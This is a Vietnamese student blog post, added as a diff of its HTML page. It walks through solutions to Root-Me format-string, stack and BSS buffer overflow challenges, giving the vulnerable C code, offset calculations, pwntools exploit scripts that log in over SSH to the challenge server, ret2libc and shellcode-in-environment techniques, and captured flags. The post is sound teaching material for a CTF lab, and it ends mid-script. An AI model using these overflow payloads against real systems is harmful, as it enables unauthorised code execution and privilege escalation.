@@ -1,0 +1,556 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[LTAT] Overflow-based Exploitation // DatNLQ</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.88.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="DatNLQ" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[LTAT] Overflow-based Exploitation"/>
+<meta name="twitter:description" content="NT521 : Overflow-based Exploitation Helu mọi người, nhân tiện mình bị 1 đống bài pwn trên lớp dí nên mình viết luôn cái blog này cho vui :3 Nếu có gì sai sót thì thầy với các bạn đừng có dí em
+ELF x86 - Format string bug basic 1 #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; int main(int argc, char *argv[]){ FILE *secret = fopen(&#34;/challenge/app-systeme/ch5/.passwd&#34;, &#34;rt&#34;); char buffer[32]; fgets(buffer, sizeof(buffer), secret); printf(argv[1]); fclose(secret); return 0; } Đầy là code của bài đầu tiên, như chúng ta có thể đọc hiểu được code C trên là: &#43; Flag từ server sẽ được đọc vào secret pointer, sau đó ghi vào biến buf &#43; In giá trị của biến argv[1] ra màn hình ==&gt; từ đó chúng ta có thể suy ra rằng có thể dùng lệnh printf tận dùng lỗi fmt ở printf và in ra flag :3"/>
+
+    <meta property="og:title" content="[LTAT] Overflow-based Exploitation" />
+<meta property="og:description" content="NT521 : Overflow-based Exploitation Helu mọi người, nhân tiện mình bị 1 đống bài pwn trên lớp dí nên mình viết luôn cái blog này cho vui :3 Nếu có gì sai sót thì thầy với các bạn đừng có dí em
+ELF x86 - Format string bug basic 1 #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; int main(int argc, char *argv[]){ FILE *secret = fopen(&#34;/challenge/app-systeme/ch5/.passwd&#34;, &#34;rt&#34;); char buffer[32]; fgets(buffer, sizeof(buffer), secret); printf(argv[1]); fclose(secret); return 0; } Đầy là code của bài đầu tiên, như chúng ta có thể đọc hiểu được code C trên là: &#43; Flag từ server sẽ được đọc vào secret pointer, sau đó ghi vào biến buf &#43; In giá trị của biến argv[1] ra màn hình ==&gt; từ đó chúng ta có thể suy ra rằng có thể dùng lệnh printf tận dùng lỗi fmt ở printf và in ra flag :3" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://datnlq.github.io/posts/bof/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-11-22T01:09:05+07:00" />
+<meta property="article:modified_time" content="2021-11-22T01:09:05+07:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
+      <h1>DatNLQ</h1>
+      <p>DatNLQ&#39;s personal website</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[LTAT] Overflow-based Exploitation</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Nov 22, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          10 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="nt521--overflow-based-exploitation">NT521 : Overflow-based Exploitation</h1>
+<p>Helu mọi người, nhân tiện mình bị 1 đống bài pwn trên lớp dí nên mình viết luôn cái blog này cho vui :3 Nếu có gì sai sót thì thầy với các bạn đừng có dí em</p>
+<h4 id="elf-x86---format-string-bug-basic-1httpswwwroot-meorgenchallengesapp-systemelf-x86-format-string-bug-basic-1"><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-1">ELF x86 - Format string bug basic 1</a></h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/fmt1.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+ 
+int main(int argc, char *argv[]){
+        FILE *secret = fopen(&#34;/challenge/app-systeme/ch5/.passwd&#34;, &#34;rt&#34;);
+        char buffer[32];
+        fgets(buffer, sizeof(buffer), secret);
+        printf(argv[1]);
+        fclose(secret);
+        return 0;
+}
+</code></pre></div><p>Đầy là code của bài đầu tiên, như chúng ta có thể đọc hiểu được code C trên là:
++ Flag từ server sẽ được đọc vào secret pointer, sau đó ghi vào biến buf
++ In giá trị của biến argv[1] ra màn hình
+==&gt; từ đó chúng ta có thể suy ra rằng có thể dùng lệnh printf tận dùng lỗi fmt ở printf và in ra flag :3</p>
+<p>Như hình chúng ta có thể thấy được là leak đc các giá trị trong stack như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/fmt1_checkoffset.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">00000020.0804b160.0804853d.00000009.bffffd07.b7e1b589.bffffbe4.b7fc3000.b7fc3000
+.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffffbe4.bffffbf
+0.47109600
+</code></pre></div><p>Tuy nhiên vì cơ chế little edian nên các bytes sẽ bị đảo lại, điều đó cũng có nghĩa là flag của chúng ta đã bị đảo lại mỗi lần cụm 4bytes. Vì đã biết lí do thì chúng ta có thể viết 1 đoạn script exploit như sau:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+from binascii import unhexlify
+
+output = &#34;00000020.0804b160.0804853d.00000009.bffffd07.b7e1b589.bffffbe4.b7fc3000.b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffffbe4.bffffbf0.47109600&#34;
+x = output.split(&#39;.&#39;)
+bytes=[]
+bytes2=[]
+for i in x:
+	bytes.append(i)
+for y in bytes:
+    little_endian = y[6:] + y[4:-2] + y[2:-4] + y[0:-6]
+    bytes2.append(little_endian)
+
+a=&#34;&#34;
+for x in bytes2:
+	a+= str(unhexlify(x)).strip(&#39;b&#39;).strip(&#34;&#39;&#34;)
+
+print(a)
+# \x00\x00\x00`\xb1\x04\x08=\x85\x04\x08\t\x00\x00\x00\x07\xfd\xff\xbf\x89\xb5\xe1\xb7\xe4\xfb\xff\xbf\x000\xfc\xb7\x000\xfc\xb7`\xb1\x04\x08Dpa9d6)(Epamd\n\x00\xbf\x1b\x86\x04\x08\x02\x00\x00\x00\xe4\xfb\xff\xbf\xf0\xfb\xff\xbf\x00\x96\x10G
+
+</code></pre></div><h4 id="elf-x86---format-string-bug-basic-2httpswwwroot-meorgenchallengesapp-systemelf-x86-format-string-bug-basic-2"><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-2">ELF x86 - Format string bug basic 2</a></h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/fmt2.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+ 
+int main( int argc, char ** argv )
+ 
+{
+ 
+        int var;
+        int check  = 0x04030201;
+ 
+        char fmt[128];
+ 
+        if (argc &lt;2)
+                exit(0);
+ 
+        memset( fmt, 0, sizeof(fmt) );
+ 
+        printf( &#34;check at 0x%x\n&#34;, &amp;check );
+        printf( &#34;argv[1] = [%s]\n&#34;, argv[1] );
+ 
+        snprintf( fmt, sizeof(fmt), argv[1] );
+ 
+        if ((check != 0x04030201) &amp;&amp; (check != 0xdeadbeef))    
+                printf (&#34;\nYou are on the right way !\n&#34;);
+ 
+        printf( &#34;fmt=[%s]\n&#34;, fmt );
+        printf( &#34;check=0x%x\n&#34;, check );
+ 
+        if (check==0xdeadbeef)
+        {
+                printf(&#34;Yeah dude ! You win !\n&#34;);
+                setreuid(geteuid(), geteuid());
+                system(&#34;/bin/bash&#34;);
+        }
+}
+</code></pre></div><p>Sau khi đọc và phân tích code ta có được:
++ Địa chỉ của biến check
++ Fmt ở câu lệnh <em>snprintf( fmt, sizeof(fmt), argv[1] )</em>
++ Thay đổi giá trị check = 0xdeadbeef để có thể gọi hàm bin/sh</p>
+<p>Ta dùng payload sau để xác định offset của hàm printf như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/fmt2_checkoffset.png?raw=true" alt="img"></p>
+<p>==&gt; offset = 9
+==&gt; check_add = 0xbffffa88
+CHuyển sang little edian = \xd8\xfa\xff\xbf</p>
+<p>Tuy nhiên, có 1 việc nữa vì 0xdeadbeef là 1 số khá lớn ở dec nên việc ghi đè sẽ rất là khó khăn, nên chúng ta có thể chia ra và ghi đè mồi 2 bytes 0xdead và 0xbeef lần lượt ở check_add và check_add + 2.</p>
+<p>Điều đó chúng ta có thể suy ra được như sau :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/fmt2_useoffset.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/fmt2_catpass.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/fmt2_win.png?raw=true" alt="img"></p>
+<h4 id="elf-x86-stack-overflow-basic-1httpswwwroot-meorgenchallengesapp-systemelf-x86-stack-buffer-overflow-basic-1"><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1">ELF x86 Stack overflow basic 1</a></h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof1.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+ 
+int main()
+{
+ 
+  int var;
+  int check = 0x04030201;
+  char buf[40];
+ 
+  fgets(buf,45,stdin);
+ 
+  printf(&#34;\n[buf]: %s\n&#34;, buf);
+  printf(&#34;[check] %p\n&#34;, check);
+ 
+  if ((check != 0x04030201) &amp;&amp; (check != 0xdeadbeef))
+    printf (&#34;\nYou are on the right way!\n&#34;);
+ 
+  if (check == 0xdeadbeef)
+   {
+     printf(&#34;Yeah dude! You win!\nOpening your shell...\n&#34;);
+     setreuid(geteuid(), geteuid());
+     system(&#34;/bin/bash&#34;);
+     printf(&#34;Shell closed! Bye.\n&#34;);
+   }
+   return 0;
+}
+
+</code></pre></div><p>Đọc code chúng ta suy ra được như sau:
++ Bof ở code <em>fgets(buf,45,stdin)</em> khi đọc 45 bytes và buf size là 40. Có nghĩa 4 bytes tiếp sẽ đè lên biến check
++ gọi hàm bin/sh để lấy pas</p>
+<p>Check offset như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof1_checkoffset.png?raw=true" alt="img"></p>
+<p>Sau đó chúng ta thay đổi giá trị của biến check theo little edian</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+import os 
+import sys
+
+host = &#34;challenge02.root-me.org&#34;
+port = 2222
+username = &#34;app-systeme-ch13&#34;
+passwd = &#34;app-systeme-ch13&#34;
+
+def exploit():
+	# payload = p32(0x80808080) + p32(0xbffffabc)
+	# io.recvuntil(b&#34;Enter your name: &#34;)
+	payload = b&#34;a&#34;*40 + p32(0xdeadbeef)
+	io.send(payload)
+	io.interactive()
+
+conn = ssh(host=host, port=port, user=username, password=passwd)
+io = conn.process(&#34;./ch13&#34;)
+exploit()
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof1_win.png?raw=true" alt="img"></p>
+<h4 id="elf-x86-stack-overflow-basic-2httpswwwroot-meorgenchallengesapp-systemelf-x86-stack-buffer-overflow-basic-2"><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-2">ELF x86 Stack overflow basic 2</a></h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof2.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+ 
+void shell() {
+    setreuid(geteuid(), geteuid());
+    system(&#34;/bin/bash&#34;);
+}
+ 
+void sup() {
+    printf(&#34;Hey dude ! Waaaaazzaaaaaaaa ?!\n&#34;);
+}
+ 
+void main()
+{
+    int var;
+    void (*func)()=sup;
+    char buf[128];
+    fgets(buf,133,stdin);
+    func();
+}
+</code></pre></div><p>Phân tích đoạn code trên chúng ta có thể thấy :
++ Mục tiêu là sẽ gọi hàm shell
++ Buf size là 128
++ Và bof ở code <em>fgets(buf,133,stdin)</em></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof2_shell.png?raw=true" alt="img"></p>
+<p>shell address = 0x8048516</p>
+<p>Với việc hàm fgets chỉ nhận 133 bytes thì việc đè lên EIP sẽ làm bytes thứ 129 sau 128 bytes của buf</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof2_binbash.png?raw=true" alt="img"></p>
+<p>B33r1sSoG0oD4y0urBr4iN</p>
+<h4 id="elf-x86-stack-overflow-basic-3httpswwwroot-meorgenchallengesapp-systemelf-x86-stack-buffer-overflow-basic-3"><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-3">ELF x86 Stack overflow basic 3</a></h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof3.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
+#include &lt;sys/time.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+ 
+void shell(void);
+ 
+int main()
+{
+ 
+  char buffer[64];
+  int check;
+  int i = 0;
+  int count = 0;
+ 
+  printf(&#34;Enter your name: &#34;);
+  fflush(stdout);
+  while(1)
+    {
+      if(count &gt;= 64)
+        printf(&#34;Oh no...Sorry !\n&#34;);
+      if(check == 0xbffffabc)
+        shell();
+      else
+        {
+            read(fileno(stdin),&amp;i,1);
+            switch(i)
+            {
+                case &#39;\n&#39;:
+                  printf(&#34;\a&#34;);
+                  break;
+                case 0x08:
+                  count--;
+                  printf(&#34;\b&#34;);
+                  break;
+                case 0x04:
+                  printf(&#34;\t&#34;);
+                  count++;
+                  break;
+                case 0x90:
+                  printf(&#34;\a&#34;);
+                  count++;
+                  break;
+                default:
+                  buffer[count] = i;
+                  count++;
+                  break;
+            }
+        }
+    }
+}
+ 
+void shell(void)
+{
+  setreuid(geteuid(), geteuid());
+  system(&#34;/bin/bash&#34;);
+}
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof3_dececheck.png?raw=true" alt="img"></p>
+<p>Sau 7749 giờ tìm hiểu thì mình đã có cách sử dụng pwntools để connect tới server của root-me như sau:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+import os 
+import sys
+
+host = &#34;challenge02.root-me.org&#34;
+port = 2222
+username = &#34;app-systeme-ch16&#34;
+passwd = &#34;app-systeme-ch16&#34;
+
+def exploit():
+	payload = p32(0x80808080) + p32(0xbffffabc)
+	io.recvuntil(b&#34;Enter your name: &#34;)
+	io.send(payload)
+	io.interactive()
+
+conn = ssh(host=host, port=port, user=username, password=passwd)
+io = conn.process(&#34;./ch16&#34;)
+exploit()
+</code></pre></div><h4 id="elf-x86-stack-overflow-basic-4httpswwwroot-meorgenchallengesapp-systemelf-x86-stack-buffer-overflow-basic-4"><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4">ELF x86 Stack overflow basic 4</a></h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof4.png?raw=true" alt="img"></p>
+<p>Có thể thấy mình sẽ khai thác lỗi bof ở hàm strcmp.
+Ở đây em sẽ chàn biến môi trường vào để khai thác lỗi, do bài này không để mình nhập input vào, nhưng trong đó hàm strcpy copy biến môi trường vào.
+Disassembly vào hàm GetEnv, thấy được stack có độ lớn là 0x21c = 540.
+Ta có được stack như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof4_stacksize.png?raw=true" alt="img"></p>
+<p>Có thể thấy phần env của PATH gần với return address nhất, mình sẽ lợi dụng nó để bof đè return address, như trên stack, tính toán được offset của nó đến ret address là 160. Và return address mình sẽ là ở đâu? Ở đây em set 1 biến môi trường SHELLCODE, sau đó return address của mình sẽ trỏ vào nó. Cụ thể set biến môi trường như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof4_ret.png?raw=true" alt="img"></p>
+<p>Nhưng còn 1 vấn đề nữa: khi ghi đè return address theo cách này, kí tự null (/x00) sẽ bịd dẩy xuống rep movsl dest. address, khiến cho chương trình bị lỗi. Thay vào đó em sẽ set 1 biến môi trường khác đè thằng rep movsl luôn</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof4_ret2.png?raw=true" alt="img"></p>
+<p>Vậy bây giờ mình có payload để set biến môi trường như sau:
+PATH = “A”*160 + địa chỉ SHELLCODE env + địa chỉ TRASH env
+Vậy làm sao để biết 2 địa chỉ trên, dựa vào Get environment variable address (github.com) em có thể dễ dàng biết.
+Exploit:
+Code tìm địa chỉ env:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof4_getadd.png?raw=true" alt="img"></p>
+<p>Khởi tạo SHELLCODE env ở server và TRASH env ở server:</p>
+<p>Lấy địa chỉ chúng nó:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof4_getadd1.png?raw=true" alt="img"></p>
+<p>Vậy là mình đã có đủ các nguyên liệu :D, sau đó viết payload truyền vào env PATH thôi:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof4_getadd2.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof4_exploit.png?raw=true" alt="img"></p>
+<blockquote>
+<p>FLAG: s2$srAkdAq18q
+NOTE: nếu bị lỗi ở can’t find USERNAME thì nhớ export USERNAME=”&lt;gì gì đó&gt;” vào nha, em bị như vậy cả tiếng đồng hồ k biết mình bị sai chỗ nào :D</p>
+</blockquote>
+<h4 id="-elf-x86---stack-buffer-overflow-basic-5httpswwwroot-meorgenchallengesapp-systemelf-x86-stack-buffer-overflow-basic-5"><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-5"> ELF x86 - Stack buffer overflow basic 5</a></h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof5.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+ 
+#define BUFFER 512
+ 
+struct Init
+{
+  char username[128];
+  uid_t uid;
+  pid_t pid;  
+   
+};
+ 
+void cpstr(char *dst, const char *src)
+{
+  for(; *src; src++, dst++)
+    {
+      *dst = *src;
+    }
+  *dst = 0;
+}
+void chomp(char *buff)
+{
+  for(; *buff; buff++)
+    {
+      if(*buff == &#39;\n&#39; || *buff == &#39;\r&#39; || *buff == &#39;\t&#39;)
+        {
+          *buff = 0;
+          break;
+        }
+    }
+}
+struct Init Init(char *filename)
+{
+   
+  FILE *file;
+  struct Init init;
+  char buff[BUFFER+1];  
+   
+   
+  if((file = fopen(filename, &#34;r&#34;)) == NULL)
+    {
+      perror(&#34;[-] fopen &#34;);
+      exit(0);
+    }
+   
+  memset(&amp;init, 0, sizeof(struct Init));
+   
+  init.pid = getpid();
+  init.uid = getuid();
+   
+  while(fgets(buff, BUFFER, file) != NULL)
+    {
+      chomp(buff);
+      if(strncmp(buff, &#34;USERNAME=&#34;, 9) == 0)
+        {
+          cpstr(init.username, buff+9);
+        }
+    }
+  fclose(file);
+  return init;
+}
+int main(int argc, char **argv)
+{
+  struct Init init;
+  if(argc != 2)
+    {
+      printf(&#34;Usage : %s &lt;config_file&gt;\n&#34;, argv[0]);
+      exit(0);
+    }
+  init = Init(argv[1]);
+  printf(&#34;[+] Runing the program with username %s, uid %d and pid %d.\n&#34;, init.username, init.uid, init.pid);
+   
+  return 0;
+}
+
+</code></pre></div><p>Có thể thấy mình có thể khai thác lỗi bof ở hàm strncmp dựa vào việc nhập input, nhưng:
+Input nhập vào ở:</p>
+<p>return address ở:</p>
+<p>và khoảng cách của chúng là:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof5_offset.png?raw=true" alt="img"></p>
+<p>nó đã vượt quá khai báo ở mảng buff (513 bytes)
+Vậy việc thực thi bof ở input không được. Nhưng vẫn còn cách khác.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof5_bof.png?raw=true" alt="img"></p>
+<p>Ở đây hàm sẽ copy mảng char buff từ vị trí số 9 đổ đi vào init.username. Vậy mình có thể khai thác ở đây bằng cách thay đổi init.username để tràn qua return address thành địa chỉ của SHELLCODE env var (chi tiết tương tự bài basic 4). Stack ta có như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof5_checkstack.png?raw=true" alt="img"></p>
+<p>Dựa vào đó chúng ta thực thi câu lệnh setreuid(1210, 1110) và system(“/bin/sh”, 0, 0).</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof5_shell.png?raw=true" alt="img"></p>
+<p>Ta có được flag như sau :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof5_done.png?raw=true" alt="img"></p>
+<h4 id="elf-x86-stack-overflow-basic-6httpswwwroot-meorgenchallengesapp-systemelf-x86-stack-buffer-overflow-basic-6"><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-6">ELF x86 Stack overflow basic 6</a></h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof6.png?raw=true" alt="img"></p>
+<p>Xem file c của đề, cơ bản ta xác định ngay lỗi stack buffer overflow sẽ ở vị trí strcpy. Bây giờ em sẽ checksec file xem có những cơ chế nào được bật.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof6_checksec.png?raw=true" alt="img"></p>
+<p>Sơ qua thì thấy NX Enabled. Do mục đích của bài này là mình chạy shell thành công, nhưng khi NX enabled thì mình không thể chèn shellcode vào, thay vào đó em sẽ chọn cách khác, chính là leak libc để run system(“bin/sh”).
+Mình có thể control được return address của hàm main, vì thế sẽ lợi dụng nó để thực hiện theo mục đích của mình. Cụ thể như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof6_checkstack.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof6_checkreg.png?raw=true" alt="img"></p>
+<p>Vì cần thực thi system(“bin/sh”), mình cần tìm địa chỉ của chúng ở đâu. Ở system là 0xb7e68310:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof_system.png?raw=true" alt="img"></p>
+<p>Ở “bin/sh”, cái này mình phải tìm trong libc, vì thế phải xác định libc ở đâu:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof6_vmap.png?raw=true" alt="img"></p>
+<p>Có thể thấy: libc ở vị trí từ 0xb7e28000 -&gt; 0xb7fd6000</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof6_findbin.png?raw=true" alt="img"></p>
+<p>/bin/sh ở 0xb7f8ad4c.</p>
+<p>Việc còn lại là tính toán offset từ input đến return address, sau đó chèn 1 đoạn địa chỉ vào đại vì mục đích là thay đổi return address thôi.
+Input em nhập vào 8 chữ A, để có thể dễ dàng xem thanh ghi trên stack hơn.</p>
+<p>Có thể thấy, input ở vị trí 0xbffffb1c.</p>
+<p>Return address nằm ở 0xbffffb3c.
+Vậy offset = 0xbffffb3c - 0xbffffb1c = 32
+Vậy payload của mình là: b’a’*32 + system + b’a’*4 + /bin/sh
+Code:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bof6_exploitcode.png?raw=true" alt="img"></p>
+<p>Thực thi thành công:
+Dùng lệnh ls -a để xem có file nào ẩn là flag không.
+Đã tìm thấy flag rồi :D</p>
+<h4 id="elf-x86---bss-buffer-overflowhttpswwwroot-meorgenchallengesapp-systemelf-x86-bss-buffer-overflow"><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-BSS-buffer-overflow">ELF x86 - BSS buffer overflow</a></h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bss.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+ 
+char username[512] = {1};
+void (*_atexit)(int) =  exit;
+ 
+void cp_username(char *name, const char *arg)
+{
+  while((*(name++) = *(arg++)));
+  *name = 0;
+} 
+int main(int argc, char **argv)
+{
+  if(argc != 2)
+    {
+      printf(&#34;[-] Usage : %s &lt;username&gt;\n&#34;, argv[0]);
+      exit(0);
+    }
+  cp_username(username, argv[1]);
+  printf(&#34;[+] Running program with username : %s\n&#34;, username);
+  _atexit(0);
+  return 0;
+}
+</code></pre></div><p>Phân tích đoạn code trên ta có được :
+Đây là 1 hàm sẽ nhận input từ arg[1]
+Hàm atexit sẽ return về 1 địa chỉ 1 hàm
+Chúng ta có thể bof để ghi đè lên địa chỉ là hàm atexit sẽ trả về
+Dùng gdb để check địa chỉ là offset của username và atexit như sau :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bss_bof.png?raw=true" alt="img"></p>
+<p>và chúng ta biết được atexit = username + 0x200
+Tiếp theo đó chúng ta viết shellcode thực thi 2 lệnh sau đây:</p>
+<p>setreuid(1210, 1110) và system(“/bin/sh”, 0, 0)</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/NT521_LTAT/image/bss_shell.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+import os
+import sys
+
+host = &#34;challenge02.root-me.org&#34;
+port = 2222
+username = &#34;app-systeme-ch7&#34;
+passwd = &#34;app-systeme-ch7&#34;
+BIN = &#34;./ch7&#34;
